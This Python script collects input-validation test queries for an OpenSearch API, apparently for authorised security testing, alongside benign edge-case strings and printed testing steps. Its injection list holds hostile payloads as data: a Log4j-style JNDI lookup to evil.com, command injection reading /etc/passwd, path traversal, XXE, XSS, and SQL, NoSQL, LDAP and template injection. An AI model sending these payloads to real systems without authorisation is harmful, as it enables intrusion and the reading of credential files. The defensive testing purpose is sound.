#!/usr/bin/env python3
"""
Security Test Queries for OpenSearch API
Educational purposes - to test input validation and security measures
"""

# OpenSearch/Elasticsearch Query DSL Injection Tests
opensearch_injection_tests = [
    # Basic malformed JSON attempts
    '{"malicious": "payload"}',
    '"; DROP TABLE users; --',
    "' OR '1'='1",
    
    # OpenSearch Query DSL injection attempts
    '{"query": {"match_all": {}}}',
    '{"query": {"bool": {"must": [{"match_all": {}}]}}}',
    '{"script": {"source": "System.exit(0)"}}',
    
    # Large/Complex queries (DoS attempts)
    'A' * 10000,  # Very long string
    '{"query": {"bool": {"should": [' + '{"match": {"field": "value"}},' * 1000 + ']}}}',
    
    # Special characters that might break parsing
    '\\n\\r\\t',
    '"""',
    "'''",
    '${jndi:ldap://evil.com/}',  # Log4j style injection
    
    # Unicode and encoding tests
    '\u0000\u0001\u0002',
    '%00%01%02',
    
    # Script injection attempts
    '<script>alert("xss")</script>',
    'javascript:alert(1)',
    
    # Command injection attempts
    '; cat /etc/passwd',
    '| whoami',
    '&& id',
    
    # Path traversal attempts
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
    
    # NoSQL injection attempts (in case backend uses NoSQL)
    '{"$where": "function() { return true; }"}',
    '{"$regex": ".*"}',
    
    # XML/XXE attempts (if API processes XML)
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
    
    # LDAP injection attempts
    '*)(uid=*',
    '*)(&(uid=*',
    
    # Template injection attempts
    '{{7*7}}',
    '${7*7}',
    '#{7*7}',
    
    # Server-side includes
    '<!--#exec cmd="id"-->',
    
    # Null bytes and control characters
    'test\x00admin',
    'test\x0dadmin',
    'test\x0aadmin',
]

# Legitimate edge case tests (boundary testing)
edge_case_tests = [
    '',  # Empty string
    ' ',  # Single space
    '   ',  # Multiple spaces
    'a',  # Single character
    'test query with spaces',
    'test-query-with-hyphens',
    'test_query_with_underscores',
    'test.query.with.dots',
    'test@query.with.email.format',
    'query with "quotes"',
    "query with 'single quotes'",
    'query with (parentheses)',
    'query with [brackets]',
    'query with {braces}',
    'query with /slashes/',
    'query with \\backslashes\\',
    'query with #hashtag',
    'query with &ampersand',
    'query with %percent',
    'query with +plus+signs',
    'query with =equals=signs',
    'query with ?question?marks',
    'query with !exclamation!marks',
    'query with *asterisks*',
    'query with ~tildes~',
    'query with `backticks`',
    'query with |pipes|',
    'query with <angle> brackets',
    'query with multiple    spaces    between    words',
    'UPPERCASE QUERY',
    'lowercase query',
    'MiXeD cAsE qUeRy',
    '1234567890',  # Numbers only
    '!@#$%^&*()_+-=[]{}|;:,.<>?',  # Special characters
    'café résumé naïve',  # Accented characters
    '中文查询',  # Chinese characters
    'العربية',  # Arabic characters
    'русский',  # Cyrillic characters
    '🔍🎯📊',  # Emojis
]

def print_test_queries():
    """Print all test queries organized by category"""
    
    print("🔒 SECURITY TEST QUERIES")
    print("=" * 80)
    print("⚠️  WARNING: Use these queries only on systems you own or have permission to test!")
    print("=" * 80)
    
    print("\n🚨 INJECTION ATTEMPTS:")
    print("-" * 40)
    for i, query in enumerate(opensearch_injection_tests, 1):
        # Truncate very long queries for display
        display_query = query[:100] + "..." if len(query) > 100 else query
        print(f"{i:2d}. {repr(display_query)}")
    
    print(f"\n✅ EDGE CASE TESTS:")
    print("-" * 40)
    for i, query in enumerate(edge_case_tests, 1):
        print(f"{i:2d}. {repr(query)}")
    
    print("\n📋 TESTING INSTRUCTIONS:")
    print("-" * 40)
    print("1. Test each query individually")
    print("2. Monitor API response codes and error messages")
    print("3. Check for:")
    print("   - Unexpected error messages revealing system info")
    print("   - Long response times (potential DoS)")
    print("   - Different behavior patterns")
    print("   - Server errors vs client errors")
    print("4. Document any anomalous responses")
    print("5. Test rate limiting with rapid requests")

def get_injection_test_queries():
    """Return list of injection test queries"""
    return opensearch_injection_tests

def get_edge_case_queries():
    """Return list of edge case test queries"""
    return edge_case_tests

def get_all_test_queries():
    """Return all test queries combined"""
    return opensearch_injection_tests + edge_case_tests

if __name__ == "__main__":
    print_test_queries()

